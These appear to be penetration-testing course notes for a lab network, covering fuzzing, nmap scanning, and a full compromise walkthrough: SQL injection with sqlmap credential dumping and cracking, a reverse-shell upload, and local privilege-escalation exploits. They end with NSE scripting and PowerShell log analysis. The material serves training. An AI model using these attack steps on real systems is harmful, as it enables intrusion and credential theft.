+Step 2a: Spider/Scan the entire site with Burp Suite
+Save the spider and scan results. I usually provide this data to the customer as well.
+ 
+ 
+Step 2b: Browse through the site using the 3 question method
+Have Burp Suite on with intercept turned off. Browse the website using the 3 question method that I've taught you in the past. When you find a place in the site where the answer to one of the 3 questions is yes - be sure to look at that individual web request in the target section of Burp Suite, right-click on that particular request and choose 'Send to Intruder'.
+ 
+Take the appropriate fuzz list from https://github.com/fuzzdb-project/fuzzdb/ and load it into Intruder. A quick tip for each individual payload is to be sure to send the payload both with and without the parameter value.
+ 
+Here is what I mean:
+http://www.site.com/page.aspx?parametername=parametervalue
+ 
+When you are looking at an individual request - often times Burp Suite will insert the payload in place of the parameter value like this:
+ 
+http://www.site.com/page.aspx?parametername=[ payload ]
+ 
+You need to ensure that you send the payload this way, and like this below:
+ 
+http://www.site.com/page.aspx?parametername=parametervalue[ payload ]
+ 
+This little hint will pay huge dividends in actually EXPLOITING the vulnerabilities you find instead of just identifying them.
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+###########################################
+# Question 2: How much fuzzing is enough? #
+###########################################
+There really is no exact science for determining the correct amount of fuzzing per parameter to do before moving on to something else.
+ 
+Here are the steps that I follow when I'm testing (my mental decision tree) to figure out how much fuzzing to do.
+ 
+ 
+Step 1: Ask yourself the 3 questions per page of the site.
+ 
+Step 2: If the answer is yes, then go down that particular attack path with a few fuzz strings (I usually do 10-20 fuzz strings per parameter)
+ 
+Step 3: When you load your fuzz strings - use the following decision tree
+ 
+    - Are the fuzz strings causing a default error message (example 404)?
+        - If this is the case then it is most likely NOT vulnerable
+ 
+    - Are the fuzz strings causing a WAF or LB custom error message?
+        - If this is the case then you need to find an encoding method to bypass
+ 
+ 
+    - Are the fuzz strings causing an error message that discloses the backend type?
+        - If yes, then identify DB type and find correct syntax to successfully exploit
+        - Some example strings that I use are:
+            '
+            "
+            ()          <----- Take the parameter value and put it in parenthesis
+            (5-1)       <----- See if you can perform an arithmetic function
+ 
+ 
+    - Are the fuzz strings rendering executable code?
+        - If yes, then report XSS/CSRF/Response Splitting/Request Smuggling/etc
+        - Some example strings that I use are:
+            <b>hello</b>
+            <u>hello</u>
+            <script>alert(123);</script>
+            <script>alert(xss);</script>
+            <script>alert('xss');</script>
+            <script>alert("xss");</script>
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+-------------------------------------------------------------------------------------------
+ OWASP Top 10 Video Explanations
+ 
+Burp Suite Reference:
+https://support.portswigger.net/customer/portal/articles/1969845-using-burp-to-test-for-the-owasp-top-ten
+ 
+A1: Injection Vulnerabilities
+https://www.youtube.com/watch?v=9CnpHT5Nn8c&list=PL5wHbxAvWUF6bXvbg2VHxQnCp_weS9hIj
+ 
+ 
+A2: Broken Authentication and Session Management
+https://www.youtube.com/watch?v=R1iGRBG3PJ8&list=PL5wHbxAvWUF6bXvbg2VHxQnCp_weS9hIj&index=2
+ 
+A3: Cross Site Scripting (XSS)
+https://www.youtube.com/watch?v=90XT0j5E7xo&list=PL5wHbxAvWUF6bXvbg2VHxQnCp_weS9hIj&index=4
+ 
+A4: Insecure Direct Object Reference
+https://www.youtube.com/watch?v=bMYpGj2xzpM&list=PL5wHbxAvWUF6bXvbg2VHxQnCp_weS9hIj&index=5
+ 
+ 
+A5: Security Misconfiguration
+https://www.youtube.com/watch?v=ouuXu9_UM0w&index=7&list=PL5wHbxAvWUF6bXvbg2VHxQnCp_weS9hIj
+ 
+ 
+A6: Sensitive Data Exposure
+https://www.youtube.com/watch?v=x-B8I420x7Y&list=PL5wHbxAvWUF6bXvbg2VHxQnCp_weS9hIj&index=8
+ 
+ 
+A7: Missing Function Level Access Control and A8 Cross-Site Request Forgery (CSRF)
+https://www.youtube.com/watch?v=gf6cb7MnP-c&index=9&list=PL5wHbxAvWUF6bXvbg2VHxQnCp_weS9hIj
+ 
+A9 Using Components w/ Known Vulnerabilities & A10 Unvalidated Redirects and Forwards
+https://www.youtube.com/watch?v=WqlSl-Pc1vk&list=PL5wHbxAvWUF6bXvbg2VHxQnCp_weS9hIj&index=10
+
+
+
+                            ###########################
+----------- ############### # Day 3: Attack Lab Hosts # ############### -----------
+                            ###########################
+
+To connect to the VPN open a web browser on your host machine (not your virtual machine) and go to the following URL:
+https://54.245.178.32/?src=connect
+ 
+ 
+Accept the security exception and enter one of the following user names:
+
+hca001
+hca002
+hca003
+hca004
+hca005
+hca006
+hca007
+hca008
+hca009
+hca010
+hca011
+hca012
+hca013
+hca014
+hca015
+hca016
+hca017
+hca018
+hca019
+
+
+password: 	*************
+
+
+target network range:	172.31.2.0/24
+
+
+
+
+##############################
+# Scanning Process to follow #
+##############################
+ 
+Step 1: Host Discovery
+----------------------
+ 
+---------------------------Type This-----------------------------------
+nmap -sP 172.31.2.0/24
+ 
+nmap -sL 172.31.2.0/24
+ 
+nmap -sS --open -p 22,445 172.31.2.0/24
+
+
+cd ~/toolz
+wget --no-check-certificate https://dl.packetstormsecurity.net/UNIX/scanners/propecia.c
+gcc propecia.c -o propecia
+sudo cp propecia /bin
+
+propecia 172.31.2 22 > file1
+propecia 172.31.2 445 > file2
+cat file1 file2 > file3
+cat file3 | sort -t . -k 3,3n -k 4,4n | uniq > lab.txt
+cat lab.txt
+-----------------------------------------------------------------------
+
+
+
+
+Step 2: Service Discovery
+-------------------------
+nmap -sS <IP-ADDRESS>
+nmap -sU -p 69,161 <IP-ADDRESS>
+ 
+ 
+---------------------------Type This-----------------------------------
+sudo nmap -sS 172.31.2.0/24
+sudo nmap -sU -p 69,161 172.31.2.0/24
+-----------------------------------------------------------------------
+
+
+
+Step 3: Service Version Discovery
+---------------------------------
+nmap -sV <IP-ADDRESS>
+nmap -sV -p- <IP-ADDRESS>
+    |
+    ----> Vulnerability Research
+ 
+---------------------------Type This-----------------------------------
+sudo nmap -sV 172.31.2.0/24
+-----------------------------------------------------------------------
+
+Step 4: Enumerate common Windows/Linux file sharing services
+        Step 3 is where most people STOP, and you need to move on and look deeper
+        ------------------------------------------------------------
+ 
+---------------------------Type This-----------------------------------
+cd ~/toolz
+sudo apt install smbclient libnss-winbind winbind
+git clone https://github.com/portcullislabs/enum4linux.git
+cd enum4linux/
+perl enum4linux.pl -U 172.31.2.11
+ 
+nmap -Pn -n --open -p111 --script=nfs-ls,nfs-showmount,nfs-statfs,rpcinfo 172.31.2.86
+---------------------------------------------------------------------------------------
+
+
+
+
+
+
+
+Identify webservers
+-------------------
+---------------------------Type This-----------------------------------
+cd ~
+
+propecia 172.31.2 22
+ 
+propecia 172.31.2 80
+ 
+propecia 172.31.2 443
+ 
+propecia 172.31.2 3389
+ 
+nmap -Pn -sV -T 5 -oG - -p 21,22,80,443,1433,3389 172.31.2.* | grep open
+ 
+nmap -Pn -sV -T 5 -oG - -p 21,22,80,443,1433,3389 172.31.2.* | awk '/open/{print $2 " " $3}'
+ 
+nmap -Pn -sV -T 5 -oG - -p 21,22,80,443,1433,3389 172.31.2.* | awk '/open/{print $2}' | wc -l
+ 
+nmap -Pn -sV -T 5 -oG - -p 21,22,80,443,1433,3389 172.31.2.* | awk '/open/{print $2}'
+ 
+nmap -Pn -sV -T 5 -oG - -p 21,22,80,443,1433,3389 172.31.2.* | awk '/open/{print $2}' > ~/labnet-ip-list.txt
+ 
+cat ~/labnet-ip-list.txt
+---------------------------------------------------------------------------------------
+
+ 
+#################################################
+# Screenshotting the Web Servers in the Network #
+#################################################
+
+---------------------------Type This-----------------------------------
+cd ~/toolz/
+mkdir labscreenshots
+cd labscreenshots/
+ 
+ 
+wget http://45.63.104.73/wkhtmltox-0.12.4_linux-generic-amd64.tar.xz
+tar xf wkhtmltox-0.12.4_linux-generic-amd64.tar.xz
+cd wkhtmltox/bin/
+sudo cp wkhtmltoimage /usr/local/bin/wkhtmltoimage-i386
+ 
+ 
+cd ~/toolz/
+git clone git://github.com/SpiderLabs/Nmap-Tools.git
+cd Nmap-Tools/NSE/
+ 
+sudo cp http-screenshot.nse /usr/share/nmap/scripts/
+     strategicsec
+ 
+sudo nmap --script-updatedb
+     strategicsec
+ 
+ 
+cd ~/toolz/labscreenshots/
+sudo nmap -Pn -T 5 -p 80 -A --script=http-screenshot 172.31.2.0/24 -iL ~/labnet-ip-list.txt
+     strategicsec
+---------------------------------------------------------------------------------------
+ 
+ 
+---------------------------Type This----------------------------------- 
+nano screenshots.sh
+---------------------------------------------------------------------------------------
+
+---------------------------Paste This into the file screenshots.sh----------------------------------- 
+#!/bin/bash
+printf "<HTML><BODY><BR>" > labnet-port-80-screenshots.html
+ls -1 *.png | awk -F : '{ print $1":"$2"\n<BR><IMG SRC=\""$1"%3A"$2"\" width=400><BR><BR>"}' >> labnet-port-80-screenshots.html
+printf "</BODY></HTML>" >> labnet-port-80-screenshots.html
+--------------------------------------------------------------------------------------- 
+ 
+ 
+ 
+---------------------------Type This-----------------------------------
+chmod +x screenshots.sh 
+
+sh screenshots.sh
+ 
+python -m SimpleHTTPServer
+--------------------------------------------------------------------------------------- 
+ 
+--- Now browse to the IP of your Linux machine on port 8000 (http://Ubuntu-VM-IP:8000/labnet-port-80-screenshots.html):
+http://192.168.150.131:8000/labnet-port-80-screenshots.html
+ 
+ 
+ 
+ 
+##########################
+# Nmap NSE tricks to try #
+##########################
+---------------------------Type This-----------------------------------
+sudo nmap -Pn -n --open -p21 --script=banner,ftp-anon,ftp-bounce,ftp-proftpd-backdoor,ftp-vsftpd-backdoor 172.31.2.0/24
+     strategicsec
+ 
+sudo nmap -Pn -n --open -p22 --script=sshv1,ssh2-enum-algos 172.31.2.0/24
+     strategicsec
+ 
+sudo nmap -Pn -n -sU --open -p53 --script=dns-blacklist,dns-cache-snoop,dns-nsec-enum,dns-nsid,dns-random-srcport,dns-random-txid,dns-recursion,dns-service-discovery,dns-update,dns-zeustracker,dns-zone-transfer 172.31.2.0/24
+     strategicsec
+ 
+sudo nmap -Pn -n --open -p111 --script=nfs-ls,nfs-showmount,nfs-statfs,rpcinfo 172.31.2.0/24
+     strategicsec
+ 
+sudo nmap -Pn -n --open -p445 --script=msrpc-enum,smb-enum-domains,smb-enum-groups,smb-enum-processes,smb-enum-sessions,smb-enum-shares,smb-enum-users,smb-mbenum,smb-os-discovery,smb-security-mode,smb-server-stats,smb-system-info,smbv2-enabled,stuxnet-detect 172.31.2.0/24
+     strategicsec
+ 
+sudo nmap -Pn -n --open -p1433 --script=ms-sql-dump-hashes,ms-sql-empty-password,ms-sql-info 172.31.2.0/24
+     strategicsec
+ 
+sudo nmap -Pn -n --open -p1521 --script=oracle-sid-brute --script oracle-enum-users --script-args oracle-enum-users.sid=ORCL,userdb=orausers.txt 172.31.2.0/24
+     strategicsec
+ 
+sudo nmap -Pn -n --open -p3306 --script=mysql-databases,mysql-empty-password,mysql-info,mysql-users,mysql-variables 172.31.2.0/24
+     strategicsec
+ 
+sudo nmap -Pn -n --open -p3389 --script=rdp-vuln-ms12-020,rdp-enum-encryption 172.31.2.0/24
+     strategicsec
+ 
+sudo nmap -Pn -n --open -p5900 --script=realvnc-auth-bypass,vnc-info 172.31.2.0/24
+     strategicsec
+ 
+sudo nmap -Pn -n --open -p6000-6005 --script=x11-access 172.31.2.0/24
+     strategicsec
+ 
+sudo nmap -Pn -n --open -p27017 --script=mongodb-databases,mongodb-info 172.31.2.0/24
+     strategicsec
+ 
+ 
+sudo nmap -sV -oA nse --script-args=unsafe=1 --script-args=unsafe  --script "auth,brute,discovery,exploit,external,fuzzer,intrusive,malware,safe,version,vuln and not(http-slowloris or http-brute or http-enum or http-form-fuzzer)" 172.31.2.0/24
+     strategicsec
+---------------------------------------------------------------------------------------
+
+
+
+
+
+
+Vulnerability scan the webserver ports
+---------------------------Type This-----------------------------------
+cd ~/toolz/
+ 
+rm -rf nikto*
+ 
+git clone https://github.com/sullo/nikto.git Nikto2
+ 
+cd Nikto2/program
+ 
+perl nikto.pl -h 172.31.2.86
+ 
+perl nikto.pl -h 172.31.2.86:8080
+-----------------------------------------------------------------------
+ 
+ 
+ 
+ 
+ 
+Step 4: Perform directory bruteforce against the target host
+---------------------------Type This-----------------------------------
+wget https://dl.packetstormsecurity.net/UNIX/cgi-scanners/Webr00t.pl
+ 
+perl Webr00t.pl -h 172.31.2.86 -v
+-----------------------------------------------------------------------
+ 
+ 
+ 
+                  or with dirbuster (dirb)
+ 
+ 
+ 
+ 
+---------------------------Type This-----------------------------------
+cd ~/toolz
+ 
+git clone https://github.com/v0re/dirb.git
+ 
+cd dirb/
+ 
+./configure
+ 
+make
+ 
+dirb
+ 
+./dirb http://172.31.2.86 wordlists/big.txt
+-----------------------------------------------------------------------
+ 
+### dirb output ###
+==> DIRECTORY: http://172.31.2.86/blocks/
+==> DIRECTORY: http://172.31.2.86/files/
+==> DIRECTORY: http://172.31.2.86/modules/
+==> DIRECTORY: http://172.31.2.86/system/
+==> DIRECTORY: http://172.31.2.86/themes/
+ 
++ http://172.31.2.86/robots.txt (CODE:200|SIZE:36)
++ http://172.31.2.86/server-status (CODE:403|SIZE:291)
+### dirb output ###
+ 
+ 
+ 
+ 
+ 
+Browsed each of the directories and found that inside of the /themes folder contained the vulnerable application Builder Engine 3.5.0
+ 
+An exploit for this application can be found at:
+https://www.exploit-db.com/exploits/40390/
+ 
+ 
+ 
+ 
+ 
+-------------------save this a "BuilderEngine.html"-------------------
+<html>
+<body>
+<form method="post" action="http://172.31.2.86/themes/dashboard/assets/plugins/jquery-file-upload/server/php/"
+ 
+enctype="multipart/form-data">
+    <input type="file" name="files[]" />
+    <input type="submit" value="send" />
+</form>
+</body>
+</html>
+-----------------------------------------------------------------------
+ 
+ 
+Download this webshell (http://pentestmonkey.net/tools/php-reverse-shell/php-reverse-shell-1.0.tar.gz) to your local machine.
+ 
+Change the IP address in the source code of the webshell to another server in the lab network that you have root access to.
+ 
+On the other server run:
+nc -lvp 1234
+ 
+Then upload the pentestmonkey reverseshell to .86
+ 
+============================================ Attacking another server because I need a reverse shell =========================================
+
+
+
+============================================ Attacking another server because I need a reverse shell =========================================
+---------------------------------------------------------------------------------------------------------------------------------------------------------
+ 
+Attack steps:
+-------------
+ 
+ 
+ 
+Step 1: Ping sweep the target network
+-------------------------------------
+ 
+ 
+---------------------------Type This-----------------------------------
+nmap -sP 172.31.2.0/24
+-----------------------------------------------------------------------
+ 
+ 
+ 
+- Found 3 hosts
+172.31.2.64
+172.31.2.217
+172.31.2.238
+ 
+ 
+ 
+Step 2: Port scan target system
+-------------------------------
+ 
+ 
+---------------------------Type This-----------------------------------
+nmap -sV 172.31.2.64
+-----------------------------------------------------------------------
+ 
+ 
+ 
+-------------Scan Results--------------------------------------------
+PORT     STATE    SERVICE VERSION
+22/tcp   open     ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.6 (Ubuntu Linux; protocol 2.0)
+80/tcp   open     http    Apache httpd 2.4.7 ((Ubuntu))
+514/tcp  filtered shell
+1037/tcp filtered ams
+6667/tcp open     irc     ngircd
+Service Info: Host: irc.example.net; OS: Linux; CPE: cpe:/o:linux:linux_kernel
+--------------------------------------------------------------------
+ 
+ 
+Step 3: Vulnerability Scan the webserver
+----------------------------------------
+ 
+ 
+---------------------------Type This-----------------------------------
+cd ~/toolz/
+ 
+rm -rf nikto*
+ 
+git clone https://github.com/sullo/nikto.git Nikto2
+ 
+cd Nikto2/program
+ 
+perl nikto.pl -h 172.31.2.64
+-----------------------------------------------------------------------
+ 
+ 
+Step 4: Run dirbuster or similar directory bruteforce tool against the target
+-----------------------------------------------------------------------------
+ 
+ 
+---------------------------Type This-----------------------------------
+wget https://dl.packetstormsecurity.net/UNIX/cgi-scanners/Webr00t.pl
+ 
+perl Webr00t.pl -h 172.31.2.64 -v
+-----------------------------------------------------------------------
+                  or with dirbuster (dirb)
+ 
+---------------------------Type This-----------------------------------
+git clone https://github.com/v0re/dirb.git
+ 
+cd dirb/
+ 
+./configure
+ 
+make
+ 
+dirb
+ 
+./dirb http://172.31.2.64 wordlists/big.txt
+-----------------------------------------------------------------------
+ 
+ 
+ 
+Step 5: Browse the web site to look for clues
+---------------------------------------------
+Since no glaring vulnerabilities were found with the scanner - we start just looking around the website itself
+ 
+ 
+..... really didn't get much from here so we just opened the web page in a browser
+http://172.31.2.64/
+ 
+.....browsed to the webpage and saw that it pointed to:
+http://172.31.2.64/jabc
+ 
+....clicked on documentation link and found hidden text that pointed to here:
+http://172.31.2.64/jabcd0cs/
+ 
+....saw that the app was OpenDocMan v1.2.7 and found it was vulnerable:
+https://www.exploit-db.com/exploits/32075/
+ 
+Tried the sql injection described in exploit-db:
+http://172.31.2.64/jabcd0cs/ajax_udf.php?q=1&add_value=odm_user UNION SELECT 1,version(),3,4,5,6,7,8,9
+ 
+http://172.31.2.64/jabcd0cs/ajax_udf.php?q=1&add_value=odm_user UNION SELECT 1,user(),3,4,5,6,7,8,9
+ 
+ 
+ 
+Tried to run sqlmap against the target
+ 
+ 
+---------------------------Type This-----------------------------------
+cd sqlmap-dev/
+python sqlmap.py -u "http://172.31.2.64/jabcd0cs/ajax_udf.php?q=1&add_value=odm_user" -b --dbms=mysql
+ 
+python sqlmap.py -u "http://172.31.2.64/jabcd0cs/ajax_udf.php?q=1&add_value=odm_user" --current-user --dbms=mysql
+ 
+python sqlmap.py -u "http://172.31.2.64/jabcd0cs/ajax_udf.php?q=1&add_value=odm_user" --current-db --dbms=mysql
+ 
+python sqlmap.py -u "http://172.31.2.64/jabcd0cs/ajax_udf.php?q=1&add_value=odm_user" --dbs --dbms=mysql
+ 
+python sqlmap.py -u "http://172.31.2.64/jabcd0cs/ajax_udf.php?q=1&add_value=odm_user" --users --passwords --dbms=mysql
+-----------------------------------------------------------------------
+ 
+ 
+ 
+FOUND: cracked password 'toor' for user 'drupal7' (sqlmap)
+FOUND: 9CFBBC772F3F6C106020035386DA5BBBF1249A11 hash is 'toor' verified at crackstation.net
+ 
+ 
+ 
+---------------------------Type This-----------------------------------
+python sqlmap.py -u "http://172.31.2.64/jabcd0cs/ajax_udf.php?q=1&add_value=odm_user" -D jabcd0cs --tables --dbms=mysql
+ 
+python sqlmap.py -u "http://172.31.2.64/jabcd0cs/ajax_udf.php?q=1&add_value=odm_user" -D jabcd0cs -T odm_user --dump --dbms=mysql
+-----------------------------------------------------------------------
+ 
+    username:   webmin
+    hash:       b78aae356709f8c31118ea613980954b
+ 
+https://hashkiller.co.uk/md5-decrypter.aspx
+   
+    hash:       b78aae356709f8c31118ea613980954b
+    pass:       webmin1980
+ 
+ 
+ok - /phpmyadmin and /webmin both did not work in the browser but these credentials worked for SSH.
+ 
+ 
+ 
+---------------------------Type This-----------------------------------
+ssh -l webmin 172.31.2.64
+    webmin1980
+ 
+id
+ 
+cat /etc/*release
+-----------------------------------------------------------------------
+ 
+ 
+ 
+....tired of not having a real command shell...
+ 
+ 
+---------------------------Type This-----------------------------------
+python -c 'import pty;pty.spawn("/bin/bash")'
+ 
+ 
+cd /tmp
+ 
+pwd
+ 
+ 
+cat >> exploit.c << out
+ 
+**************paste in the content from here *****************
+https://www.exploit-db.com/raw/39166/
+ 
+ 
+------ hit enter a few times ------
+ 
+------ then type 'out' ----- this closes the file handle...
+ 
+ 
+ 
+---------------------------Type This-----------------------------------
+gcc -o boom exploit.c
+ 
+./boom
+-----------------------------------------------------------------------
+ 
+ 
+------------exploit failed, damn let's try another one ---------
+ 
+ 
+ 
+---------------------------Type This-----------------------------------
+cat >> exploit2.c << out
+ 
+**************paste in the content from here *****************
+https://www.exploit-db.com/raw/37292/
+ 
+ 
+out
+ 
+ 
+gcc -o boom2 exploit2.c
+ 
+./boom2
+ 
+id
+ 
+ 
+......YEAH - do the happy dance!!!!
+=============================================== Now back to the previous server ==============================================================
+ 
+
+
+#####################################
+# Writing Your Own Nmap NSE Scripts #
+#####################################
+ 
+ 
+---------------------------Type This-----------------------------------
+sudo nano /usr/share/nmap/scripts/intro-nse.nse
+----------------------------------------------------------------------
+
+---------------------------Paste This into the file intro-nse.nse----------------------------------- 
+-- The Head Section --
+-- The Rule Section --
+portrule = function(host, port)
+    return port.protocol == "tcp"
+            and port.number == 80
+            and port.state == "open"
+end
+ 
+-- The Action Section --
+action = function(host, port)
+    return "HCA!"
+end
+----------------------------------------------------------------------
+ 
+- Ok, now that we've made that change let's run the script
+---------------------------Type This-----------------------------------
+sudo nmap --script=/usr/share/nmap/scripts/intro-nse.nse infosecaddicts.com -p 22,80,443
+---------------------------------------------------------------------- 
+ 
+ 
+ 
+ 
+ 
+---------------------------Type This-----------------------------------
+sudo nano /usr/share/nmap/scripts/intro-nse.nse
+----------------------------------------------------------------------
+
+---------------------------Paste This into the file intro-nse.nse-----------------------------------  
+-- The Head Section --
+local shortport = require "shortport"
+ 
+-- The Rule Section --
+portrule = shortport.http
+ 
+ 
+-- The Action Section --
+action = function(host, port)
+    return "HCA!"
+end
+----------------------------------------------------------------------
+ 
+- Ok, now that we've made that change let's run the script
+---------------------------Type This-----------------------------------
+sudo nmap --script=/usr/share/nmap/scripts/intro-nse.nse infosecaddicts.com -p 22,80,443
+---------------------------------------------------------------------- 
+ 
+ 
+ 
+ 
+ 
+ 
+OK, now let's have some fun with my buddy Carlos Perez's website which you should have been looking at quite a lot if you were trying to get Ruby 2.1.5 working last year.
+ 
+---------------------------Type This-----------------------------------
+sudo nano /usr/share/nmap/scripts/intro-nse.nse
+----------------------------------------------------------------------
+
+---------------------------Paste This into the file intro-nse.nse-----------------------------------  
+-- The Head Section --
+local shortport = require "shortport"
+local http = require "http"
+ 
+-- The Rule Section --
+portrule = shortport.http
+ 
+-- The Action Section --
+action = function(host, port)
+ 
+    local uri = "/installing-metasploit-in-ubunt/"
+    local response = http.get(host, port, uri)
+    return response.status
+ 
+end
+----------------------------------------------------------------------
+ 
+- Ok, now that we've made that change let's run the script
+---------------------------Type This-----------------------------------
+sudo nmap --script=/usr/share/nmap/scripts/intro-nse.nse darkoperator.com -p 22,80,443
+---------------------------------------------------------------------- 
+ 
+ 
+ 
+---------------------------Type This-----------------------------------
+sudo nano /usr/share/nmap/scripts/intro-nse.nse
+----------------------------------------------------------------------
+
+---------------------------Paste This into the file intro-nse.nse-----------------------------------  
+-- The Head Section --
+local shortport = require "shortport"
+local http = require "http"
+ 
+-- The Rule Section --
+portrule = shortport.http
+ 
+-- The Action Section --
+action = function(host, port)
+ 
+    local uri = "/installing-metasploit-in-ubunt/"
+    local response = http.get(host, port, uri)
+ 
+    if ( response.status == 200 ) then
+        return response.body
+    end
+ 
+end
+----------------------------------------------------------------------
+ 
+- Ok, now that we've made that change let's run the script
+---------------------------Type This-----------------------------------
+sudo nmap --script=/usr/share/nmap/scripts/intro-nse.nse darkoperator.com -p 22,80,443
+---------------------------------------------------------------------- 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+---------------------------Type This-----------------------------------
+sudo nano /usr/share/nmap/scripts/intro-nse.nse
+----------------------------------------------------------------------
+
+---------------------------Paste This into the file intro-nse.nse-----------------------------------  
+-- The Head Section --
+local shortport = require "shortport"
+local http = require "http"
+local string = require "string"
+ 
+-- The Rule Section --
+portrule = shortport.http
+ 
+-- The Action Section --
+action = function(host, port)
+ 
+    local uri = "/installing-metasploit-in-ubunt/"
+    local response = http.get(host, port, uri)
+ 
+    if ( response.status == 200 ) then
+        local title = string.match(response.body, "Installing Metasploit in Ubuntu and Debian")
+        return title
+    end
+ 
+end
+----------------------------------------------------------------------
+ 
+- Ok, now that we've made that change let's run the script
+---------------------------Type This-----------------------------------
+sudo nmap --script=/usr/share/nmap/scripts/intro-nse.nse darkoperator.com -p 22,80,443
+---------------------------------------------------------------------- 
+ 
+ 
+ 
+ 
+ 
+ 
+---------------------------Type This-----------------------------------
+sudo nano /usr/share/nmap/scripts/intro-nse.nse
+----------------------------------------------------------------------
+
+---------------------------Paste This into the file intro-nse.nse-----------------------------------  
+-- The Head Section --
+local shortport = require "shortport"
+local http = require "http"
+local string = require "string"
+ 
+-- The Rule Section --
+portrule = shortport.http
+ 
+-- The Action Section --
+action = function(host, port)
+ 
+    local uri = "/installing-metasploit-in-ubunt/"
+    local response = http.get(host, port, uri)
+ 
+    if ( response.status == 200 ) then
+        local title = string.match(response.body, "Installing Metasploit in Ubuntu and Debian")
+ 
+        if (title) then
+            return "Vulnerable"
+        else
+            return "Not Vulnerable"
+        end
+    end
+end
+ 
+----------------------------------------------------------------------
+ 
+- Ok, now that we've made that change let's run the script
+---------------------------Type This-----------------------------------
+sudo nmap --script=/usr/share/nmap/scripts/intro-nse.nse darkoperator.com -p 22,80,443
+----------------------------------------------------------------------
+
+
+
+#####################
+# Powershell Basics #
+#####################
+ 
+PowerShell is Microsoft's new scripting language that has been built in since the release Vista.
+ 
+PowerShell file extension end in .ps1 .
+ 
+An important note is that you cannot double click on a PowerShell script to execute it.
+ 
+To open a PowerShell command prompt either hit Windows Key + R and type in PowerShell or Start -> All Programs -> Accessories -> Windows PowerShell -> Windows PowerShell.
+ 
+------------------------Type This------------------------------
+cd c:\
+dir
+cd
+ls
+---------------------------------------------------------------
+ 
+ 
+To obtain a list of cmdlets, use the Get-Command cmdlet
+------------------------Type This------------------------------
+Get-Command
+---------------------------------------------------------------
+ 
+ 
+You can use the Get-Alias cmdlet to see a full list of aliased commands.
+------------------------Type This------------------------------
+Get-Alias
+---------------------------------------------------------------
+ 
+ 
+Don't worry you won't blow up your machine with Powershell
+------------------------Type This------------------------------
+Get-Process | stop-process              Don't press [ ENTER ] What will this command do?
+Get-Process | stop-process -whatif
+---------------------------------------------------------------
+ 
+To get help with a cmdlet, use the Get-Help cmdlet along with the cmdlet you want information about.
+------------------------Type This------------------------------
+Get-Help Get-Command
+ 
+Get-Help Get-Service –online
+ 
+Get-Service -Name TermService, Spooler
+ 
+Get-Service –N BITS
+---------------------------------------------------------------
+ 
+ 
+ 
+ 
+ 
+- Run cmdlet through a pie and refer to its properties as $_
+------------------------Type This------------------------------
+Get-Service | where-object {  $_.Status -eq "Running"}
+---------------------------------------------------------------
+ 
+ 
+ 
+- PowerShell variables begin with the $ symbol. First lets create a variable
+------------------------Type This------------------------------
+$serv = Get-Service –N Spooler
+---------------------------------------------------------------
+ 
+To see the value of a variable you can just call it in the terminal.
+------------------------Type This------------------------------
+$serv
+ 
+$serv.gettype().fullname
+---------------------------------------------------------------
+ 
+ 
+Get-Member is another extremely useful cmdlet that will enumerate the available methods and properties of an object. You can pipe the object to Get-Member or pass it in
+------------------------Type This------------------------------
+$serv | Get-Member
+ 
+Get-Member -InputObject $serv
+---------------------------------------------------------------
+ 
+ 
+ 
+ 
+Let's use a method and a property with our object.
+------------------------Type This------------------------------
+$serv.Status
+$serv.Stop()
+$serv.Refresh()
+$serv.Status
+$serv.Start()
+$serv.Refresh()
+$serv.Status
+---------------------------------------------------------------
+ 
+ 
+If you want some good command-line shortcuts you can check out the following link:
+https://technet.microsoft.com/en-us/library/ff678293.aspx
+ 
+#############################
+# Simple Event Log Analysis #
+#############################
+ 
+Step 1: Dump the event logs
+---------------------------
+The first thing to do is to dump them into a format that facilitates later processing with Windows PowerShell.
+ 
+To dump the event log, you can use the Get-EventLog and the Exportto-Clixml cmdlets if you are working with a traditional event log such as the Security, Application, or System event logs.
+If you need to work with one of the trace logs, use the Get-WinEvent and the ExportTo-Clixml cmdlets.
+------------------------Type This------------------------------
+Get-EventLog -LogName application | Export-Clixml Applog.xml
+ 
+type .\Applog.xml
+ 
+$logs = "system","application","security"
+---------------------------------------------------------------
+ 
+ 
+The % symbol is an alias for the Foreach-Object cmdlet. It is often used when working interactively from the Windows PowerShell console
+------------------------Type This------------------------------
+$logs | % { get-eventlog -LogName $_ | Export-Clixml "$_.xml" }
+---------------------------------------------------------------
+ 
+ 
+ 
+ 
+Step 2: Import the event log of interest
+----------------------------------------
+To parse the event logs, use the Import-Clixml cmdlet to read the stored XML files.
+Store the results in a variable.
+Let's take a look at the commandlets Where-Object, Group-Object, and Select-Object.
+ 
+The following two commands first read the exported security log contents into a variable named $seclog, and then the five oldest entries are obtained.
+------------------------Type This------------------------------
+$seclog = Import-Clixml security.xml
+ 
+$seclog | select -Last 5
+---------------------------------------------------------------
+ 
+Cool trick from one of our students named Adam. This command allows you to look at the logs for the last 24 hours:
+------------------------Type This------------------------------
+Get-EventLog Application -After (Get-Date).AddDays(-1)
+---------------------------------------------------------------
+You can use '-after' and '-before' to filter date ranges
+ 
+One thing you must keep in mind is that once you export the security log to XML, it is no longer protected by anything more than the NFTS and share permissions that are assigned to the location where you store everything.
+By default, an ordinary user does not have permission to read the security log.
+ 
+ 
+ 
+ 
+Step 3: Drill into a specific entry
+-----------------------------------
+To view the entire contents of a specific event log entry, choose that entry, send the results to the Format-List cmdlet, and choose all of the properties.
+ 
+------------------------Type This------------------------------
+$seclog | select -first 1 | fl *
+---------------------------------------------------------------
+ 
+The message property contains the SID, account name, user domain, and privileges that are assigned for the new login.
+ 
+------------------------Type This------------------------------
+($seclog | select -first 1).message
+ 
+(($seclog | select -first 1).message).gettype()
+---------------------------------------------------------------
+ 
+ 
+In the *nix world you often want a count of something (wc -l).
+How often is the SeSecurityPrivilege privilege mentioned in the message property?
+To obtain this information, pipe the contents of the security log to a Where-Object to filter the events, and then send the results to the Measure-Object cmdlet to determine the number of events:
+------------------------Type This------------------------------
+$seclog | ? { $_.message -match 'SeSecurityPrivilege'} | measure
+---------------------------------------------------------------
+If you want to ensure that only event log entries return that contain SeSecurityPrivilege in their text, use Group-Object to gather the matches by the EventID property.
+ 
+------------------------Type This------------------------------
+$seclog | ? { $_.message -match 'SeSecurityPrivilege'} | group eventid
+---------------------------------------------------------------
+ 
+Because importing the event log into a variable from the stored XML results in a collection of event log entries, it means that the count property is also present.
+Use the count property to determine the total number of entries in the event log.
